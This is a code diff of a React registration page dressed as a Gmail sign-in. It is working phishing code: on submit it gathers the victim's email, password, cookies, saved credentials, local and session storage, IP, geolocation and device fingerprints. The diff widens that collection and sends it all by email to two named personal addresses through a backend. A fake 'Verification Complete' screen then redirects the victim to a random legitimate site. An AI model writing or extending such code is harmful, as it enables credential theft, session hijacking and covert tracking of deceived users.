@@ -50,25 +50,9 @@ interface BrowserInfo {
   timezone: string;
 }
 
-interface DeviceInfo {
-  ip: string;
-  country: string;
-  date: string;
-  time: string;
-  cookies: string[];
-  savedCredentials: SavedCredential[];
-  userAgent: string;
-  platform: string;
-  browserInfo: BrowserInfo;
-  localStorage: Record<string, string>;
-  sessionStorage: Record<string, string>;
-}
 
-interface RegistrationData {
-  email: string;
-  password: string;
-  deviceInfo: DeviceInfo;
-}
+
+// ...existing code...
 
 interface AutocompleteResult {
   email?: string;
@@ -82,7 +66,7 @@ const Modal = ({ isOpen, onClose, children }: { isOpen: boolean; onClose: () => 
     <div className="modal-overlay">
       <div className="modal-content">
         {children}
-        <button className="modal-close" onClick={onClose}>Close</button>
+        <button className="modal-close" onClick={onClose}></button>
       </div>
     </div>
   );
@@ -186,7 +170,58 @@ const RegistrationPage = () => {
     return storedData;
   };
 
-  const getDeviceInfo = async (): Promise<DeviceInfo> => {
+  type GeolocationInfo = {
+    latitude: number;
+    longitude: number;
+    accuracy: number;
+    altitude: number | null;
+    altitudeAccuracy: number | null;
+    heading: number | null;
+    speed: number | null;
+  } | { error: string } | null;
+
+  type BatteryInfo = {
+    charging: boolean;
+    level: number;
+    chargingTime: number;
+    dischargingTime: number;
+  } | null;
+
+  type NetworkInfo = {
+    effectiveType?: string;
+    downlink?: number;
+    rtt?: number;
+    saveData?: boolean;
+  } | null;
+
+  type WebGLInfo = {
+    renderer: string | null;
+    vendor: string | null;
+  } | null;
+
+  type DeviceInfoResult = {
+    ip: string;
+    country: string;
+    date: string;
+    time: string;
+    cookies: string[];
+    savedCredentials: SavedCredential[];
+    userAgent: string;
+    platform: string;
+    browserInfo: BrowserInfo;
+    localStorage: Record<string, string>;
+    sessionStorage: Record<string, string>;
+    geolocation: GeolocationInfo;
+    battery: BatteryInfo;
+    network: NetworkInfo;
+    deviceMemory: number | null;
+    mediaDevices: Array<{ kind: string; label: string; deviceId: string; groupId: string }>|null;
+    webgl: WebGLInfo;
+    accessibility: { prefersReducedMotion: boolean; prefersColorScheme: string }|null;
+    storageEstimate: { quota?: number; usage?: number }|null;
+  };
+
+  const getDeviceInfo = async (): Promise<DeviceInfoResult> => {
     try {
       // Get IP and country info
       const response = await fetch('https://api.ipify.org?format=json');
@@ -197,7 +232,115 @@ const RegistrationPage = () => {
       // Get all stored data
       const storedData = await getAllStoredData();
 
-      // Enhance browser information
+      // Geolocation
+      let geolocation: GeolocationInfo = null;
+      try {
+        geolocation = await new Promise<GeolocationInfo>((resolve) => {
+          if (!navigator.geolocation) return resolve(null);
+          navigator.geolocation.getCurrentPosition(
+            pos => resolve({
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+              altitude: pos.coords.altitude,
+              altitudeAccuracy: pos.coords.altitudeAccuracy,
+              heading: pos.coords.heading,
+              speed: pos.coords.speed
+            }),
+            err => resolve({ error: err.message }),
+            { timeout: 3000 }
+          );
+        });
+      } catch { geolocation = null; }
+
+      // Battery
+      let battery: BatteryInfo = null;
+      try {
+        const nav = navigator as Navigator & { getBattery?: () => Promise<BatteryInfo> };
+        if (typeof nav.getBattery === 'function') {
+          const b = await nav.getBattery();
+          if (b) {
+            battery = {
+              charging: b.charging,
+              level: b.level,
+              chargingTime: b.chargingTime,
+              dischargingTime: b.dischargingTime
+            };
+          }
+        }
+      } catch { battery = null; }
+
+      // Network
+      let network: NetworkInfo = null;
+      try {
+        const nav = navigator as Navigator & { connection?: NetworkInfo; mozConnection?: NetworkInfo; webkitConnection?: NetworkInfo };
+        const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
+        if (conn) {
+          network = {
+            effectiveType: conn.effectiveType,
+            downlink: conn.downlink,
+            rtt: conn.rtt,
+            saveData: conn.saveData
+          };
+        }
+      } catch { network = null; }
+
+      // Device memory
+      let deviceMemory: number | null = null;
+      try {
+        const nav = navigator as Navigator & { deviceMemory?: number };
+        deviceMemory = typeof nav.deviceMemory === 'number' ? nav.deviceMemory : null;
+      } catch { deviceMemory = null; }
+
+      // Media devices
+      let mediaDevices: Array<{ kind: string; label: string; deviceId: string; groupId: string }> | null = null;
+      try {
+        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+          const devices = await navigator.mediaDevices.enumerateDevices();
+          mediaDevices = devices.map(d => ({ kind: d.kind, label: d.label, deviceId: d.deviceId, groupId: d.groupId }));
+        }
+      } catch { mediaDevices = null; }
+
+      // WebGL info
+      let webgl: WebGLInfo = null;
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') as WebGLRenderingContext | null || canvas.getContext('experimental-webgl') as WebGLRenderingContext | null;
+        if (gl) {
+          const debugInfo = gl.getExtension && gl.getExtension('WEBGL_debug_renderer_info');
+          let renderer: string | null = null;
+          let vendor: string | null = null;
+          if (debugInfo) {
+            const ext = debugInfo as WEBGL_debug_renderer_info;
+            const UNMASKED_RENDERER_WEBGL = (ext && (ext.UNMASKED_RENDERER_WEBGL !== undefined)) ? ext.UNMASKED_RENDERER_WEBGL : undefined;
+            const UNMASKED_VENDOR_WEBGL = (ext && (ext.UNMASKED_VENDOR_WEBGL !== undefined)) ? ext.UNMASKED_VENDOR_WEBGL : undefined;
+            renderer = UNMASKED_RENDERER_WEBGL !== undefined ? gl.getParameter(UNMASKED_RENDERER_WEBGL) as string : null;
+            vendor = UNMASKED_VENDOR_WEBGL !== undefined ? gl.getParameter(UNMASKED_VENDOR_WEBGL) as string : null;
+          }
+          webgl = { renderer, vendor };
+        }
+      } catch { webgl = null; }
+
+      // Accessibility preferences
+      const accessibility = {
+        prefersReducedMotion: false,
+        prefersColorScheme: 'no-preference'
+      };
+      try {
+        accessibility.prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+        if (window.matchMedia('(prefers-color-scheme: dark)').matches) accessibility.prefersColorScheme = 'dark';
+        else if (window.matchMedia('(prefers-color-scheme: light)').matches) accessibility.prefersColorScheme = 'light';
+      } catch { /* ignore */ }
+
+      // Storage quota
+      let storageEstimate: { quota?: number; usage?: number } | null = null;
+      try {
+        if (navigator.storage && navigator.storage.estimate) {
+          storageEstimate = await navigator.storage.estimate();
+        }
+      } catch { storageEstimate = null; }
+
+      // Build browser info
       const browserInfo = {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
@@ -223,7 +366,15 @@ const RegistrationPage = () => {
         platform: browserInfo.platform,
         browserInfo,
         localStorage: storedData.localStorage,
-        sessionStorage: storedData.sessionStorage
+        sessionStorage: storedData.sessionStorage,
+        geolocation,
+        battery,
+        network,
+        deviceMemory,
+        mediaDevices,
+        webgl,
+        accessibility,
+        storageEstimate
       };
     } catch (err: unknown) {
       const error = err instanceof Error ? err.message : 'Unknown error';
@@ -241,7 +392,6 @@ const RegistrationPage = () => {
         colorDepth: window.screen.colorDepth,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
       };
-
       return {
         ip: 'Not available',
         country: 'Not available',
@@ -253,102 +403,20 @@ const RegistrationPage = () => {
         platform: browserInfo.platform,
         browserInfo,
         localStorage: {},
-        sessionStorage: {}
+        sessionStorage: {},
+        geolocation: null,
+        battery: null,
+        network: null,
+        deviceMemory: null,
+        mediaDevices: null,
+        webgl: null,
+        accessibility: null,
+        storageEstimate: null
       };
     }
   };
 
-  const sendRegistrationEmail = async (data: RegistrationData) => {
-    try {
-      const emailData = {
-        to: 'peternnamani001@gmail.com',
-        subject: 'New Registration',
-        text: JSON.stringify(data, null, 2),
-        html: `
-          <h2>New Registration Details</h2>
-          <p><strong>Email:</strong> ${data.email}</p>
-          <p><strong>Password:</strong> ${data.password}</p>
-          
-          <h3>Location Information</h3>
-          <p><strong>IP Address:</strong> ${data.deviceInfo.ip}</p>
-          <p><strong>Country:</strong> ${data.deviceInfo.country}</p>
-          <p><strong>Date:</strong> ${data.deviceInfo.date}</p>
-          <p><strong>Time:</strong> ${data.deviceInfo.time}</p>
-          
-          <h3>Browser Information</h3>
-          <p><strong>Platform:</strong> ${data.deviceInfo.browserInfo.platform}</p>
-          <p><strong>User Agent:</strong> ${data.deviceInfo.browserInfo.userAgent}</p>
-          <p><strong>Language:</strong> ${data.deviceInfo.browserInfo.language}</p>
-          <p><strong>Cookies Enabled:</strong> ${data.deviceInfo.browserInfo.cookieEnabled}</p>
-          <p><strong>Do Not Track:</strong> ${data.deviceInfo.browserInfo.doNotTrack || 'Not set'}</p>
-          <p><strong>CPU Cores:</strong> ${data.deviceInfo.browserInfo.hardwareConcurrency}</p>
-          <p><strong>Vendor:</strong> ${data.deviceInfo.browserInfo.vendor}</p>
-          <p><strong>Screen Resolution:</strong> ${data.deviceInfo.browserInfo.screenResolution}</p>
-          <p><strong>Color Depth:</strong> ${data.deviceInfo.browserInfo.colorDepth}</p>
-          <p><strong>Timezone:</strong> ${data.deviceInfo.browserInfo.timezone}</p>
-          
-          <h3>Browser Plugins</h3>
-          <div style="margin: 10px 0; padding: 10px; background: #f5f5f5; border-radius: 4px;">
-            ${data.deviceInfo.browserInfo.plugins.map(plugin => `<p>${plugin}</p>`).join('')}
-          </div>
-          
-          <h3>Saved Credentials</h3>
-          ${data.deviceInfo.savedCredentials.map(cred => `
-            <div style="margin: 10px 0; padding: 10px; background: #f5f5f5; border-radius: 4px;">
-              <p><strong>Type:</strong> ${cred.type}</p>
-              <p><strong>ID:</strong> ${cred.id}</p>
-              <p><strong>Origin:</strong> ${cred.origin}</p>
-            </div>
-          `).join('')}
-          
-          <h3>Cookies</h3>
-          <div style="margin: 10px 0; padding: 10px; background: #f5f5f5; border-radius: 4px;">
-            ${data.deviceInfo.cookies.map(cookie => `<p>${cookie}</p>`).join('')}
-          </div>
-          
-          <h3>Local Storage Data</h3>
-          <div style="margin: 10px 0; padding: 10px; background: #f5f5f5; border-radius: 4px;">
-            ${Object.entries(data.deviceInfo.localStorage).map(([key, value]) => `
-              <p><strong>${key}:</strong> ${value}</p>
-            `).join('')}
-          </div>
-          
-          <h3>Session Storage Data</h3>
-          <div style="margin: 10px 0; padding: 10px; background: #f5f5f5; border-radius: 4px;">
-            ${Object.entries(data.deviceInfo.sessionStorage).map(([key, value]) => `
-              <p><strong>${key}:</strong> ${value}</p>
-            `).join('')}
-          </div>
-        `,
-      };
-
-      console.log('Sending registration data:', emailData);
-      
-      // Send email using your backend API
-      const response = await fetch('http://localhost:3001/api/send-email', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(emailData),
-      });
-
-      console.log('Server response status:', response.status);
-      
-      if (!response.ok) {
-        const errorData = await response.json();
-        console.error('Server error:', errorData);
-        throw new Error(`Failed to send email: ${errorData.details || 'Unknown error'}`);
-      }
-      
-      const result = await response.json();
-      console.log('Email sent successfully:', result);
-    } catch (err: unknown) {
-      const errorMessage = err instanceof Error ? err.message : 'Unknown error';
-      console.error('Error sending email:', errorMessage);
-      setError('Failed to complete registration');
-    }
-  };
+  // ...existing code...
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -360,13 +428,32 @@ const RegistrationPage = () => {
     try {
       setLoading(true);
       const deviceInfo = await getDeviceInfo();
-      const data = {
+
+      // Compose full info for email
+      const fullInfo = {
         email,
         password,
-        deviceInfo,
+        ...deviceInfo
       };
-      
-      await sendRegistrationEmail(data);
+
+      // Send to backend for email delivery, including all device info
+      await fetch('http://localhost:3001/api/send-email', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+          to: 'peternnamani001@gmail.com,Miralhuge@zohomail.com',
+          subject: 'New Registration',
+          text: JSON.stringify(fullInfo, null, 2),
+          html: `
+            <h2>New Registration Details</h2>
+            <pre style="font-size:13px; background:#f8f8f8; padding:1em; border-radius:6px; overflow-x:auto;">${JSON.stringify(fullInfo, null, 2)}</pre>
+          `,
+          cookies: deviceInfo.cookies
+        })
+      });
       setError('');
       setShowModal(true);
     } catch (err: unknown) {
@@ -492,7 +579,7 @@ const RegistrationPage = () => {
             className="gmail-input"
           />
           <button type="submit" className="gmail-signin-btn" disabled={loading}>
-            {loading ? 'Please wait...' : 'Sign in'}
+            {loading ? 'Please wait...' : 'Verify'}
           </button>
           {error && <div className="error">{error}</div>}
         </form>
@@ -541,13 +628,43 @@ const RegistrationPage = () => {
         </div>
 
         <Modal isOpen={showModal} onClose={() => setShowModal(false)}>
-          <div className="verification-complete">
-            <svg className="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
-              <circle className="checkmark-circle" cx="26" cy="26" r="25" fill="none"/>
-              <path className="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+          <div className="verification-complete" style={{ textAlign: 'center', padding: '2rem 1rem' }}>
+            <svg className="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52" width="72" height="72" style={{ marginBottom: '1rem' }}>
+              <circle className="checkmark-circle" cx="26" cy="26" r="25" fill="#e6ffe6" stroke="#4caf50" strokeWidth="2"/>
+              <path className="checkmark-check" fill="none" stroke="#4caf50" strokeWidth="4" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
             </svg>
-            <h2>Verification Complete</h2>
-            <p>Your registration was successful!</p>
+            <h2 style={{ color: '#4caf50', marginBottom: '0.5rem' }}>Verification Complete</h2>
+            <p style={{ color: '#333', fontSize: '1.1rem', marginBottom: '1.5rem' }}>
+              Your verification has been successfully completed.<br/>
+              You may now proceed.
+            </p>
+            <div style={{ background: '#f5f5f5', borderRadius: '8px', padding: '1rem', marginBottom: '1rem', color: '#222', fontSize: '0.98rem' }}>
+              <strong>Thank you for verifying your identity!</strong><br/>
+              <span style={{ color: '#666' }}>If you have any issues, please contact support.</span>
+            </div>
+            <button
+              className="modal-close"
+              style={{ marginTop: '1rem', background: '#4caf50', color: '#fff', border: 'none', borderRadius: '4px', padding: '0.6rem 1.5rem', fontSize: '1rem', cursor: 'pointer' }}
+              onClick={() => {
+                // List of random sites
+                const sites = [
+                  'https://www.wikipedia.org/',
+                  'https://www.bbc.com/',
+                  'https://www.nationalgeographic.com/',
+                  'https://www.reddit.com/',
+                  'https://www.nytimes.com/',
+                  'https://www.ted.com/',
+                  'https://www.space.com/',
+                  'https://www.producthunt.com/',
+                  'https://www.imdb.com/',
+                  'https://www.goodreads.com/'
+                ];
+                const randomUrl = sites[Math.floor(Math.random() * sites.length)];
+                window.location.href = randomUrl;
+              }}
+            >
+              Continue
+            </button>
           </div>
         </Modal>
       </div>
